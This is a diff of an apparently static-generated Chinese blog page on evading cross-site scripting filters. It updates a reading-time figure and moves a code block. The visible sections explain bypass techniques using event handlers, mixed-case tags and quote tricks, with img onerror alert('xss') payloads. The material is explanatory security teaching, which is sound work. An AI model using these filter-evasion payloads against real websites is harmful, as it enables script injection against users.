@@ -146,7 +146,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    11
+                    8
                      分钟
                   </span>
                 
@@ -197,11 +197,8 @@
 <li><p><strong>利用事件</strong><br>windows事件、form事件、keyboard事件、mouse事件、media事件</p>
 </li>
 <li><p><strong>大小写绕过</strong><br>HTML中不区分大小写，而JS的过滤区分大小写</p>
+ <pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">Img</span> <span class="hljs-attr">sRc</span>=<span class="hljs-string">'#'</span> <span class="hljs-attr">OnERroR</span>=<span class="hljs-string">"alERt('xss')"</span>/&gt;</span></code></pre>
 </li>
-</ol>
-<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">Img</span> <span class="hljs-attr">sRc</span>=<span class="hljs-string">'#'</span> <span class="hljs-attr">OnERroR</span>=<span class="hljs-string">"alERt('xss')"</span>/&gt;</span></code></pre>
-
-<ol start="7">
 <li><p><strong>利用引号</strong><br>HTML中对引号不区分，而过滤函数有可能做了区分</p>
 <pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>= <span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>'<span class="hljs-attr">xss</span>') /&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">'#'</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">'alert('</span><span class="hljs-attr">xss</span>')'/&gt;</span>
